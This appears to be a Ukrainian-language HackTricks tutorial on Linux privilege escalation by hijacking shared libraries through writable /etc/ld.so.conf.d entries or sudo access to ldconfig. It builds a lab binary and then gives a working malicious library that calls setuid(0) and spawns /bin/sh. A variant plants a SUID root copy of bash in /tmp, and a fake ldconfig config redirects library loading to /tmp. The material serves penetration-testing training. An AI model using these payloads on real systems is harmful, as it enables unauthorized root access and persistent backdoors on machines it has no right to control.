# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Підготуйте середовище

У наступному розділі ви можете знайти код файлів, які ми будемо використовувати для підготовки середовища

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Створіть** ці файли на своїй машині в тій самій папці
2. **Скомпілюйте** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Скопіюйте** `libcustom.so` до `/usr/lib` і оновіть cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Скомпілюйте** **executive**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Перевірте environment

Переконайтеся, що _libcustom.so_ **завантажується** з _/usr/lib_ і що ви можете **виконати** binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Корисні triage команди

Під час атаки на реальну ціль перевірте **точну назву бібліотеки**, яка потрібна binary, і що loader **зараз резолвить**:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Кілька корисних нюансів:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` зазвичай **не працює**, тому що
  перенаправлення виконує ваш поточний shell. Натомість використовуйте
  `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- **SUID/privileged** binaries ігнорують `LD_LIBRARY_PATH`/`LD_PRELOAD` у
  **secure-execution mode**, але директорії з `/etc/ld.so.conf` усе ще є
  частиною довіреної конфігурації loader, тож ця misconfiguration все ще може
  впливати на privileged programs.
- У новіших версіях glibc dynamic loader також надає
  `--list-diagnostics`, що зручно для debug cache resolution і вибору
  піддиректорії `glibc-hwcaps`, коли hijack поводиться не так, як очікується.

## Exploit

У цьому сценарії припустімо, що **хтось створив вразливий запис** у файлі в _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Вразлива папка — _/home/ubuntu/lib_ (де ми маємо доступ на запис).\
**Завантажте та скомпілюйте** наведений нижче код у цьому шляху:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Якщо ви очікуєте, що **root** (або інший привілейований обліковий запис) пізніше виконає вразливий binary, зазвичай краще залишити **root-owned artifact** замість запуску інтерактивного shell. Наприклад:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Тоді, після того як відбудеться привілейоване виконання, ви можете використати `/tmp/rootbash -p`.

Тепер, коли ми **створили шкідливу бібліотеку libcustom всередині неправильно налаштованого** шляху, нам потрібно дочекатися **reboot** або щоб користувач root виконав **`ldconfig`** (_якщо ви можете виконати цей binary через **sudo** або він має **suid bit**, ви зможете виконати його самостійно_).

Після того як це станеться, **перевірте ще раз**, звідки виконавчий файл `sharedvuln` завантажує бібліотеку `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Як ви можете бачити, це **завантажується з `/home/ubuntu/lib`**, і якщо будь-який користувач виконає це, буде запущено shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Зверніть увагу, що в цьому прикладі ми не підвищили privileges, але, модифікуючи команди, що виконуються, і **чекаючи, поки root або інший privileged user запустить вразливий binary**, ми зможемо підвищити privileges.

### Other misconfigurations - Same vuln

У попередньому прикладі ми підробили misconfiguration, де administrator **встановив непривілейовану теку всередині configuration file у `/etc/ld.so.conf.d/`**.\
Але є й інші misconfiguration, які можуть спричинити ту саму vulnerability: якщо у вас є **write permissions** у якомусь **config file** всередині `/etc/ld.so.conf.d`s, у теці `/etc/ld.so.conf.d` або у файлі `/etc/ld.so.conf`, ви можете налаштувати ту саму vulnerability і exploit it.

## Exploit 2

**Припустімо, у вас є sudo privileges над `ldconfig`**.\
Ви можете вказати `ldconfig` **звідки завантажувати conf files**, тож ми можемо скористатися цим, щоб змусити `ldconfig` завантажити arbitrary folders.\
Тож давайте створимо files і folders, потрібні для завантаження "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Тепер, як зазначено в **previous exploit**, **створіть шкідливу бібліотеку всередині `/tmp`**.\
І нарешті, давайте завантажимо шлях і перевіримо, звідки binary завантажує бібліотеку:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Як ви можете бачити, маючи sudo privileges над `ldconfig`, ви можете експлуатувати ту саму vulnerability.**



## References

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
